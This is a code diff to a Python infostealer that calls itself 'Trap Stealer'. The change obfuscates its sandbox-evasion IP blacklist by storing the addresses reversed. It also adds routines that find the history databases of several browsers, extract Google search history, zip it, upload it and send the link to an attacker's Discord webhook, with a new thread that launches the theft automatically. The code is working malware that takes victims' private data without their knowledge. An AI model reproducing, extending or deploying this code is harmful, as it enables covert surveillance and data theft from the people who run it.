@@ -20,7 +20,7 @@ from base64 import b64decode
 import os.path, zipfile
 import shutil, json, sqlite3
 from win32crypt import CryptUnprotectData
-
+import tempfile, datetime
 ### CONFIG ### 
 webhook = '%Webhook%' #Put your webhook
 
@@ -69,16 +69,31 @@ def check_windows():
     while True:
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
         time.sleep(0.5)
+        
 def check_ip():
-    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
+    blacklisted = [
+        '822.842.352.43', '311.45.741.48', '64.842.821.32', '441.291.112.29', '432.75.04.291',
+        '3.15.932.591', '72.0.501.43', '071.352.58.43', '302.622.231.88', '701.39.291.53',
+        '022.47.241.43', '47.011.112.291', '341.19.501.881', '42.18.52.59', '19.451.47.901',
+        '151.722.911.212', '142.27.501.43', '902.57.612.39', '061.901.112.29', '761.722.911.212',
+        '031.64.38.43', '09.451.47.901', '05.8.931.87', '21.26.741.48', '79.0.112.08',
+        '611.19.501.881', '961.371.541.901', '54.411.821.391', '32.69.831.43', '21.74.732.53',
+        '142.342.58.43', '95.15.932.591', '05.241.33.312', '001.522.231.88', '83.21.81.401',
+        '722.96.922.53', '991.55.112.29', '102.391.522.391', '312.05.661.78', '09.402.52.59',
+        '411.641.141.43', '471.98.541.43', '31.6.991.53', '52.542.141.43', '301.82.78.291',
+        '222.67.47.591', '86.381.501.43', '17.132.231.88', '07.561.932.871', '85.591.541.43',
+        '961.991.351.88', '29.451.47.901', '061.87.451.491', '501.571.181.591', '261.21.421.46',
+        '371.19.501.881', '371.061.99.02', '26.25.112.29', '33.902.401.97', '832.722.231.88'
+    ]
     while True:
         try:
             ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
-            if ip in blacklisted:
+            if ip[::-1] in blacklisted:
                 exit_program('Ip Blacklisted')
             return
         except:
             pass
+        
 def check_registry():
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
@@ -626,7 +641,195 @@ def upload_file(file_path):
 
 
 
+def find_history_file(browser_name, path_template):
+    if os.name == "nt":
+        data_path = os.path.expanduser(path_template.format(browser_name))
+    elif os.name == "posix":
+        data_path = os.path.expanduser(path_template.format(browser_name))
+    else:
+        return None
 
+    return data_path if os.path.exists(data_path) else None
+
+def find_chrome_history_file():
+    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+
+def find_edge_history_file():
+    return find_history_file("Microsoft\\Edge\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+
+def find_operagx_history_file():
+    return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")
+
+def find_firefox_history_file():
+    if os.name == "nt":
+        profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+    elif os.name == "posix":
+        profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
+    else:
+        return None
+
+    profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
+    if not profiles:
+        return None
+
+    profile_path = os.path.join(profile_path, profiles[0])
+    history_file_path = os.path.join(profile_path, "places.sqlite")
+
+    return history_file_path if os.path.exists(history_file_path) else None
+
+def find_opera_history_file():
+    return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
+
+def find_safari_history_file():
+    if os.name == "nt":
+        data_path = os.path.expanduser("~\\Apple\\Safari\\History.db")
+    elif os.name == "posix":
+        data_path = os.path.expanduser("~/Library/Safari/History.db")
+    else:
+        return None
+
+    return data_path if os.path.exists(data_path) else None
+
+def find_ie_history_file():
+    if os.name == "nt":
+        data_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat")
+    else:
+        return None
+
+    return data_path if os.path.exists(data_path) else None
+
+def find_safari_technology_preview_history_file():
+    if os.name == "nt":
+        data_path = os.path.expanduser("~\\Apple\\Safari Technology Preview\\History.db")
+    elif os.name == "posix":
+        data_path = os.path.expanduser("~/Library/SafariTechnologyPreview/History.db")
+    else:
+        return None
+
+    return data_path if os.path.exists(data_path) else None
+
+def save_search_history_to_file(history_file, output_file):
+    if not history_file:
+        return
+
+    try:
+        conn = sqlite3.connect(history_file)
+        cursor = conn.cursor()
+        cursor.execute("SELECT title, url, last_visit_time FROM urls WHERE url LIKE '%google.com/search?q=%' ORDER BY last_visit_time DESC")
+        search_history = cursor.fetchall()
+
+        if search_history:
+            with open(output_file, 'w', encoding='utf-8') as file:
+                for item in search_history:
+                    title, url, last_visit_time = item
+                    formatted_time = datetime.fromtimestamp(last_visit_time / 1000000).strftime('%Y-%m-%d %H:%M:%S')
+                    file.write(f"{formatted_time}: {title} - {url}\n")
+        cursor.close()
+        conn.close()
+    except sqlite3.Error as e:
+        if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
+            pass
+
+def is_process_running(process_name):
+    try:
+        output = subprocess.check_output(["tasklist", "/NH", "/FO", "CSV"], shell=True, universal_newlines=True)
+        return any(process_name.lower() in line.lower() for line in output.split('\n'))
+    except subprocess.CalledProcessError:
+        return False
+from datetime import datetime
+from time import time as timess
+
+def extract_history_with_timeout(browser_name, find_history_func, temp_dir, files_to_zip):
+    start_time = timess()
+    browser_executable = f"{browser_name.lower().replace(' ', '_')}.exe"
+    if is_process_running(browser_executable):
+        return
+
+    history_file = find_history_func()
+    elapsed_time = timess() - start_time
+
+    if history_file:
+        output_file = os.path.join(temp_dir, f"{browser_name.lower().replace(' ', '_')}_search_history.txt")
+        try:
+            save_search_history_to_file(history_file, output_file)
+            files_to_zip.append(output_file)
+        except sqlite3.Error as e:
+            if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
+                pass
+
+def create_browser_zip(browser_name, find_history_func, temp_dir):
+    history_file = find_history_func()
+    if history_file:
+        output_file = os.path.join(temp_dir, f"{browser_name.lower().replace(' ', '_')}_search_history.txt")
+        save_search_history_to_file(history_file, output_file)
+        return output_file
+    return None
+
+def brohist():
+    browsers = {
+        "Chrome": find_chrome_history_file,
+        "Edge": find_edge_history_file,
+        "Opera GX": find_operagx_history_file,
+        "Firefox": find_firefox_history_file,
+        "Opera": find_opera_history_file,
+        "Safari": find_safari_history_file,
+        "Internet Explorer": find_ie_history_file,
+        "Safari Technology Preview": find_safari_technology_preview_history_file,
+    }
+    files_to_zip = []
+
+    threads = []
+    temp_dir = tempfile.mkdtemp()
+
+    try:
+        for browser_name, find_history_func in browsers.items():
+            thread = threading.Thread(target=extract_history_with_timeout, args=(browser_name, find_history_func, temp_dir, files_to_zip))
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+        if files_to_zip:
+            zip_file_name = os.path.join(os.path.expandvars('%temp%'), "browser.zip")
+            with zipfile.ZipFile(zip_file_name, 'w') as zipf:
+                for file_to_zip in files_to_zip:
+                    if os.path.exists(file_to_zip):
+                        zipf.write(file_to_zip, os.path.basename(file_to_zip))
+                        os.remove(file_to_zip)  
+    finally:
+        for file_to_delete in files_to_zip:
+            if os.path.exists(file_to_delete):
+                os.remove(file_to_delete)
+
+def histup():
+    try:
+        brohist()
+        zip_file_name = os.path.join(os.path.expandvars('%temp%'), "browser.zip")
+        yrk = upload_file(zip_file_name)
+        data = {
+            
+            "username": "Trap Stealer",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": "🍪 Trap Stealer History",
+                    "description": f"Browser History File\n{yrk}",
+                    "color": 0xffb6c1,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    }
+                }
+            ]
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        
+    except:
+        pass
 Tokqs = ''
 def getTokq(path, arg):
     if not os.path.exists(path): return
@@ -1195,6 +1398,10 @@ def GatherAll():
     a.start()
     Threadlist.append(a)
     threadlist2 = []
+    
+    hist = threading.Thread(target=histup)
+    hist.start()
+    threadlist2.append(hist)
 
     coo = threading.Thread(target=getcook)
     coo.start()
